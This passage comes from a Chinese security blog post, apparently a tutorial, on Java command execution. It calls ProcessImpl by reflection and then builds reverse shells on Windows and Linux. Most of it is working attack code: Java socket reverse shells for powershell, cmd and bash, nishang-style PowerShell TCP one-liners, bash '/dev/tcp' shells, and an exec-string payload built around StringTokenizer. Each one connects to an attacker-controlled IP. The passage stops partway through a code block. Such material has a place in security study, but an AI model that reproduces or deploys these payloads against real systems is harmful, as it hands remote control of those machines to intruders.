class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">create:</span><span class="hljs-number">593</span>, ProcessImpl (java.lang)<br>&lt;init&gt;:<span class="hljs-number">453</span>, ProcessImpl (java.lang)<br><span class="hljs-symbol">start:</span><span class="hljs-number">139</span>, ProcessImpl (java.lang)<br><span class="hljs-symbol">start:</span><span class="hljs-number">1029</span>, ProcessBuilder (java.lang)<br><span class="hljs-symbol">exec:</span><span class="hljs-number">621</span>, Runtime (java.lang)<br><span class="hljs-symbol">exec:</span><span class="hljs-number">451</span>, Runtime (java.lang)<br><span class="hljs-symbol">exec:</span><span class="hljs-number">348</span>, Runtime (java.lang)<br><span class="hljs-symbol">main:</span><span class="hljs-number">8</span>, ExecTest (<span class="hljs-keyword">com</span>.lingx5.windows)<br></code></pre></td></tr></table></figure><p>做个测试，通过反射拿到 ProcessImpl 拿到他的 Class 文件，利用他的构造方法来执行命令</p><blockquote><p>因为 create 方法，只有构造方法调用了，且 ProcessImpl 这个类只有一个构造方法，所以我们就不能通过无参构造器拿到类后，再执行 create 了</p><center>    <img src="https://gitee.com/ling-x5/img/raw/master/image-20250730145156033.png" alt="image-20250730145156033" style="zoom: 67%;" />    <img src="https://gitee.com/ling-x5/img/raw/master/image-20250730145239345.png" alt="image-20250730145239345" style="zoom:50%;" /></center></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.lingx5.windows;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">createTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Class&lt;?&gt; aClass = Class.forName(<span class="hljs-string">&quot;java.lang.ProcessImpl&quot;</span>);<br>        System.out.println(aClass);<br>        Constructor&lt;?&gt; constructor = aClass.getDeclaredConstructor(String[].class, String.class,<br>                String.class,<br>                <span class="hljs-type">long</span>[].class, <span class="hljs-type">boolean</span>.class);<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br>        constructor.newInstance(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">long</span>[]&#123;-<span class="hljs-number">1L</span>,-<span class="hljs-number">1L</span>,-<span class="hljs-number">1L</span>&#125;, <span class="hljs-literal">false</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>通过 ProcessImpl 的构造方法成功执行命令</p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250730145507620.png" alt="image-20250730145507620" style="zoom: 50%;" /><h3 id="linux-平台"><a href="#linux-平台" class="headerlink" title="linux 平台"></a>linux 平台</h3><p>其实和 window 差不多，最后都是通过 native 方法(linux 是 forkAndExec() 方法)，实现命令执行的，详细可以参考：<a href="https://www.javasec.org/javase/CommandExecution/">Java 本地命令执行</a></p><p>调用栈</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">java.lang.UNIXProcess.&lt;init&gt;(UNIXProcess.java:<span class="hljs-number">247</span>)<br>java.lang.ProcessImpl.start(ProcessImpl.java:<span class="hljs-number">134</span>)<br>java.lang.ProcessBuilder.start(ProcessBuilder.java:<span class="hljs-number">1029</span>)<br>java.lang.Runtime.exec(Runtime.java:<span class="hljs-number">620</span>)<br>java.lang.Runtime.exec(Runtime.java:<span class="hljs-number">450</span>)<br>java.lang.Runtime.exec(Runtime.java:<span class="hljs-number">347</span>)<br></code></pre></td></tr></table></figure><p><a href="https://github.com/unofficial-openjdk/openjdk/blob/e59bd5b27066bb2eb77828110ee585b1598ba636/src/java.base/unix/native/libjava/ProcessImpl_md.c#L579">navtive forkAndExec 源码</a></p><h2 id="windows-revShell"><a href="#windows-revShell" class="headerlink" title="windows revShell"></a>windows revShell</h2><p>java 在 windows 下反弹 shell 比较通用的就是建立 socket 连接来实现 cmd，powershell 进程的 <code>I/O 重定向</code> ，还有就是命令本身的 <code>I/O 重定向</code></p><h3 id="socket"><a href="#socket" class="headerlink" title="socket"></a>socket</h3><p>JavaSocketRevShell</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.lingx5.windows;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.InputStream;<br><span class="hljs-keyword">import</span> java.io.OutputStream;<br><span class="hljs-keyword">import</span> java.net.Socket;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JavaSocketRevShell</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">pumpStream</span><span class="hljs-params">(InputStream in, OutputStream out)</span> &#123;<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-type">byte</span>[] buffer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br>                <span class="hljs-type">int</span> bytesRead;<br>                <span class="hljs-keyword">while</span> ((bytesRead = in.read(buffer)) != -<span class="hljs-number">1</span>) &#123;<br>                    out.write(buffer, <span class="hljs-number">0</span>, bytesRead);<br>                    out.flush();<br>                &#125;<br>            &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            &#125; <span class="hljs-keyword">finally</span> &#123;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    in.close();<br>                    out.close();<br>                &#125; <span class="hljs-keyword">catch</span> (IOException ignored) &#123;&#125;<br>            &#125;<br>        &#125;).start();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">conn</span><span class="hljs-params">(String host, <span class="hljs-type">int</span> port, String... cmd)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">try</span> (<span class="hljs-type">Socket</span> <span class="hljs-variable">socket</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Socket</span>(host, port)) &#123;<br>            <span class="hljs-type">ProcessBuilder</span> <span class="hljs-variable">pb</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(cmd);<br>            <span class="hljs-type">Process</span> <span class="hljs-variable">process</span> <span class="hljs-operator">=</span> pb.start();<br>            pumpStream(socket.getInputStream(), process.getOutputStream());<br>            pumpStream(process.getInputStream(), socket.getOutputStream());<br>            pumpStream(process.getErrorStream(), socket.getOutputStream());<br>            process.waitFor();<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br><br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">JavaSocketRevShell</span>().conn(<span class="hljs-string">&quot;10.10.11.11&quot;</span>, <span class="hljs-number">9001</span>, <span class="hljs-string">&quot;powershell.exe&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>成功反弹</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250730174911904.png" alt="image-20250730174911904"></p><p>弹 cmd 的 shell 的话，要在后面加上 <code>/k</code> 参数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">JavaSocketRevShell</span>().conn(<span class="hljs-string">&quot;10.10.11.11&quot;</span>, <span class="hljs-number">9001</span>, <span class="hljs-string">&quot;cmd.exe&quot;</span>,<span class="hljs-string">&quot;/k&quot;</span>)<br>    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>也可以反弹回来</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250730174848114.png" alt="image-20250730174848114"></p><h3 id="powershell-命令"><a href="#powershell-命令" class="headerlink" title="powershell 命令"></a>powershell 命令</h3><p>powershell 这个 shell 环境也很强大，可以使用 powershell 脚本，其中具有可以重定向输入输出的命令，详见 <a href="https://github.com/samratashok/nishang/tree/master">nishang</a> 框架 ：</p><p><a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcpOneLine.ps1">nishang&#x2F;Shells&#x2F;Invoke-PowerShellTcpOneLine.ps1 at master · samratashok&#x2F;nishang</a></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$client</span> = <span class="hljs-built_in">New-Object</span> System.Net.Sockets.TCPClient(<span class="hljs-string">&#x27;192.168.254.1&#x27;</span>,<span class="hljs-number">4444</span>);<span class="hljs-variable">$stream</span> = <span class="hljs-variable">$client</span>.GetStream();[<span class="hljs-built_in">byte</span>[]]<span class="hljs-variable">$bytes</span> = <span class="hljs-number">0</span>..<span class="hljs-number">65535</span>|%&#123;<span class="hljs-number">0</span>&#125;;<span class="hljs-keyword">while</span>((<span class="hljs-variable">$i</span> = <span class="hljs-variable">$stream</span>.Read(<span class="hljs-variable">$bytes</span>, <span class="hljs-number">0</span>, <span class="hljs-variable">$bytes</span>.Length)) <span class="hljs-operator">-ne</span> <span class="hljs-number">0</span>)&#123;;<span class="hljs-variable">$data</span> = (<span class="hljs-built_in">New-Object</span> <span class="hljs-literal">-TypeName</span> System.Text.ASCIIEncoding).GetString(<span class="hljs-variable">$bytes</span>,<span class="hljs-number">0</span>, <span class="hljs-variable">$i</span>);<span class="hljs-variable">$sendback</span> = (<span class="hljs-built_in">iex</span> <span class="hljs-variable">$data</span> <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span> | <span class="hljs-built_in">Out-String</span> );<span class="hljs-variable">$sendback2</span>  = <span class="hljs-variable">$sendback</span> + <span class="hljs-string">&#x27;PS &#x27;</span> + (<span class="hljs-built_in">pwd</span>).Path + <span class="hljs-string">&#x27;&gt; &#x27;</span>;<span class="hljs-variable">$sendbyte</span> = ([<span class="hljs-type">text.encoding</span>]::ASCII).GetBytes(<span class="hljs-variable">$sendback2</span>);<span class="hljs-variable">$stream</span>.Write(<span class="hljs-variable">$sendbyte</span>,<span class="hljs-number">0</span>,<span class="hljs-variable">$sendbyte</span>.Length);<span class="hljs-variable">$stream</span>.Flush()&#125;;<span class="hljs-variable">$client</span>.Close()<br></code></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$sm</span>=(<span class="hljs-built_in">New-Object</span> Net.Sockets.TCPClient(<span class="hljs-string">&#x27;192.168.254.1&#x27;</span>,<span class="hljs-number">55555</span>)).GetStream();[<span class="hljs-built_in">byte</span>[]]<span class="hljs-variable">$bt</span>=<span class="hljs-number">0</span>..<span class="hljs-number">65535</span>|%&#123;<span class="hljs-number">0</span>&#125;;<span class="hljs-keyword">while</span>((<span class="hljs-variable">$i</span>=<span class="hljs-variable">$sm</span>.Read(<span class="hljs-variable">$bt</span>,<span class="hljs-number">0</span>,<span class="hljs-variable">$bt</span>.Length)) <span class="hljs-operator">-ne</span> <span class="hljs-number">0</span>)&#123;;<span class="hljs-variable">$d</span>=(<span class="hljs-built_in">New-Object</span> Text.ASCIIEncoding).GetString(<span class="hljs-variable">$bt</span>,<span class="hljs-number">0</span>,<span class="hljs-variable">$i</span>);<span class="hljs-variable">$st</span>=([<span class="hljs-type">text.encoding</span>]::ASCII).GetBytes((<span class="hljs-built_in">iex</span> <span class="hljs-variable">$d</span> <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span>));<span class="hljs-variable">$sm</span>.Write(<span class="hljs-variable">$st</span>,<span class="hljs-number">0</span>,<span class="hljs-variable">$st</span>.Length)&#125;<br></code></pre></td></tr></table></figure><p>对应 java 代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.lingx5.windows;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ExecRevShell</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">ip</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#x27;10.10。11.11&#x27;&quot;</span>;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">port</span> <span class="hljs-operator">=</span> <span class="hljs-number">9001</span>;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;$client = New-Object System.Net.Sockets.TCPClient(&quot;</span>+ip+<span class="hljs-string">&quot;,&quot;</span>+port+<span class="hljs-string">&quot;);&quot;</span> +<br>                <span class="hljs-string">&quot;$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%&#123;0&#125;;while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)&#123;;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2  = $sendback + &#x27;PS &#x27; + (pwd).Path + &#x27;&gt; &#x27;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()&#125;;$client.Close()&quot;</span>;<br>        Runtime.getRuntime().exec(<span class="hljs-string">&quot;powershell.exe &quot;</span>+cmd);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>也是可以成功反弹 shell</p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250730174728842.png" alt="image-20250730174728842" style="zoom:50%;" /><p>当然也可以去看 <a href="https://forum.ywhack.com/reverse-shell/">反弹 shell 生成器</a> 生成的 payload，有的杀软会报毒，注意甄别。</p><h2 id="linux-revShell"><a href="#linux-revShell" class="headerlink" title="linux revShell"></a>linux revShell</h2><p>当然 linux 也是可以使用 socket 进行 shell 的反弹的</p><h3 id="socket-1"><a href="#socket-1" class="headerlink" title="socket"></a>socket</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.lingx5.windows;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.InputStream;<br><span class="hljs-keyword">import</span> java.io.OutputStream;<br><span class="hljs-keyword">import</span> java.net.Socket;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JavaSocketRevShell</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">pumpStream</span><span class="hljs-params">(InputStream in, OutputStream out)</span> &#123;<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-type">byte</span>[] buffer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br>                <span class="hljs-type">int</span> bytesRead;<br>                <span class="hljs-keyword">while</span> ((bytesRead = in.read(buffer)) != -<span class="hljs-number">1</span>) &#123;<br>                    out.write(buffer, <span class="hljs-number">0</span>, bytesRead);<br>                    out.flush();<br>                &#125;<br>            &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            &#125; <span class="hljs-keyword">finally</span> &#123;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    in.close();<br>                    out.close();<br>                &#125; <span class="hljs-keyword">catch</span> (IOException ignored) &#123;&#125;<br>            &#125;<br>        &#125;).start();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">conn</span><span class="hljs-params">(String host, <span class="hljs-type">int</span> port, String... cmd)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">try</span> (<span class="hljs-type">Socket</span> <span class="hljs-variable">socket</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Socket</span>(host, port)) &#123;<br>            <span class="hljs-type">ProcessBuilder</span> <span class="hljs-variable">pb</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(cmd);<br>            <span class="hljs-type">Process</span> <span class="hljs-variable">process</span> <span class="hljs-operator">=</span> pb.start();<br>            pumpStream(socket.getInputStream(), process.getOutputStream());<br>            pumpStream(process.getInputStream(), socket.getOutputStream());<br>            pumpStream(process.getErrorStream(), socket.getOutputStream());<br>            process.waitFor();<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br><br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">JavaSocketRevShell</span>().conn(<span class="hljs-string">&quot;10.10.11.11&quot;</span>, <span class="hljs-number">9001</span>, <span class="hljs-string">&quot;bash&quot;</span>,<span class="hljs-string">&quot;-i&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><img src="https://gitee.com/ling-x5/img/raw/master/image-20250731101542221.png" alt="image-20250731101542221" style="zoom:67%;" /><p>也可以成功反弹</p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250731101510436.png" alt="image-20250731101510436" style="zoom:50%;" /><h3 id="bash-命令"><a href="#bash-命令" class="headerlink" title="bash 命令"></a>bash 命令</h3><h4 id="cmdarray"><a href="#cmdarray" class="headerlink" title="cmdarray"></a>cmdarray</h4><p>其实和我们之前讲的如出一辙</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">bash -c <span class="hljs-string">&#x27;bash -i &gt;&amp; /dev/tcp/10.10.11.11/9001 0&gt;&amp;1&#x27;</span> <br></code></pre></td></tr></table></figure><p>对应的 java 代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ExecRevShell</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            String[] cmd = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<br>                <span class="hljs-string">&quot;bash&quot;</span>,<br>                <span class="hljs-string">&quot;-c&quot;</span>,<br>                <span class="hljs-string">&quot;bash -i &gt;&amp; /dev/tcp/10.10.11.11/9001 0&gt;&amp;1&quot;</span><br>            &#125;;<br>            java.lang.Runtime.getRuntime().exec(cmd);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>这里要传入数组，不然在 StringTokenizer 的处理过程中，会把我们的 bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.10.11.11&#x2F;9001 0 &gt;&amp;1 按照空格拆分，那显然不是我们想要的</p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250731110033628.png" alt="image-20250731110033628" style="zoom:50%;" /></blockquote><p>kali 执行</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250731105616577.png" alt="image-20250731105616577"></p><p>成功反弹</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250731105403909.png" alt="image-20250731105403909"></p><h4 id="cmdString"><a href="#cmdString" class="headerlink" title="cmdString"></a>cmdString</h4><p>那我们可以基于 bash 和 StringTokenizer 的特性，构造一个可以反弹 shell 的字符串吗？</p><p>我们先来看 bash -c 的帮助</p><p>执行 man bash 可以看到 -c 的介绍</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">-c     If the -c option is present, <span class="hljs-keyword">then</span> commands are <span class="hljs-built_in">read</span> from the first non-option argument command_string.  If there are argu‐ments after the command_string, the first argument is assigned to <span class="hljs-variable">$0</span> and any remaining arguments are assigned to the posi‐tional parameters.  The assignment to <span class="hljs-variable">$0</span> sets the name of the shell, <span class="hljs-built_in">which</span> is used <span class="hljs-keyword">in</span> warning and error messages.<br></code></pre></td></tr></table></figure><p>翻译过来就是</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">如果存在 -c 选项，则从第一个非选项参数 command_string 中读取命令。如果 command_string 之后有参数，则第一个参数被赋值给 <span class="hljs-variable">$0</span>，其余参数被赋值给位置参数。赋值给 <span class="hljs-variable">$0</span> 会设置 shell 的名称，该名称用于警告和错误消息中。<br></code></pre></td></tr></table></figure><p><strong>例子</strong><br>简而言之就是 <code>bash -c String1 String2 String3 ...</code> -c 参数后边有多个字符串的话，bash 的处理是将 <strong>String1 识别为要执行的字符串</strong>，String2 赋值给 $0，String3赋值给$ 1 以此类推。</p><p>在 bash 中有一个特殊的变量 <code>$@</code> 和 <code>$*</code> 它会扩展为所有的位置参数（<code>$1</code>, <code>$2</code>, <code>$3</code>, …）</p><blockquote><p>bash 执行命令的流程</p><ol><li><strong>词法分析（Parsing）</strong>: Shell 将你的命令行输入分解成一个个的“词”（tokens）。</li><li><strong>I&#x2F;O 重定向扫描与处理 (Redirection)</strong>: 在进行任何变量扩展或命令执行之前，Shell 会从左到右扫描整个命令行，寻找重定向操作符（如 <code>&gt;</code>、<code>&lt;</code>、<code>&gt;&amp;</code>、<code>&gt;&gt;</code> 等）。</li><li><strong>变量与参数扩展 (Expansion)</strong>: Shell 进行变量替换（<code>$VAR</code>）、参数扩展（<code>$@</code>）、命令替换（<code>$(command)</code>）等。</li><li><strong>命令执行 (Execution)</strong>: 最后，Shell 执行命令。</li></ol></blockquote><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250731150007446.png" alt="image-20250731150007446"></p><p>看样子 <code>$@</code> 和 <code>$*</code> 是相同的，但是 <code>&quot;$@&quot;</code> , <code>&quot;$*&quot;</code> 还是有区别的</p><p><code>&quot;$@&quot;</code> : 把 <code>$1</code> <code>$2</code> <code>$3</code> … 等，转化为单独字符串，就比如上边的 <code>&quot;bash&quot; &quot;-i&quot; &quot;&gt;&amp;&quot; &quot;/dev/tcp/10.10.11.11/9001&quot; &quot;0&gt;&amp;1&quot;</code> 每一个都是单独的字符串</p><p><code>&quot;$*&quot;</code> : 把 <code>$1</code> <code>$2</code> <code>$3</code> … 等，转化为一整个字符串，就比如把上面的转化为 <code>&quot;bash -i &gt;&amp; /dev/tcp/10.10.11.11/9001 0&gt;&amp;1&quot;</code> 分隔符为 IFS 变量的第一个字节（默认为空格）</p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250731150825987.png" alt="image-20250731150825987" style="zoom: 67%;" /><p>看到可以反弹成功</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250731150902166.png" alt="image-20250731150902166"></p><p>利用这一特性 和 java Runtime#exec 的 StringTokenizer 分词特性，我们可以构造反弹 shell 命令</p><h5 id="错误的-payload"><a href="#错误的-payload" class="headerlink" title="错误的 payload"></a>错误的 payload</h5><p>讲了这么多，你肯定是想直接这样写 payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">bash -c <span class="hljs-string">&quot;$*&quot;</span> 0 bash -i &gt;&amp; /dev/tcp/10.10.11.11/9001 0&gt;&amp;1<br></code></pre></td></tr></table></figure><p>分词处理</p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250731151542469.png" alt="image-20250731151542469" style="zoom:50%;" /><p>执行验证</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><br><span class="hljs-keyword">import</span> java.io.BufferedReader;<br><span class="hljs-keyword">import</span> java.io.InputStream;<br><span class="hljs-keyword">import</span> java.io.InputStreamReader;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ExecRevShell</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Process</span> <span class="hljs-variable">process</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(<span class="hljs-string">&quot;bash -c \&quot;$*\&quot; 0 bash -i &gt;&amp; /dev/tcp/10.10.11.11/9001 0&gt;&amp;1&quot;</span>);<br>            <span class="hljs-type">InputStream</span> <span class="hljs-variable">errorStream</span> <span class="hljs-operator">=</span> process.getErrorStream();<br>            <span class="hljs-type">BufferedReader</span> <span 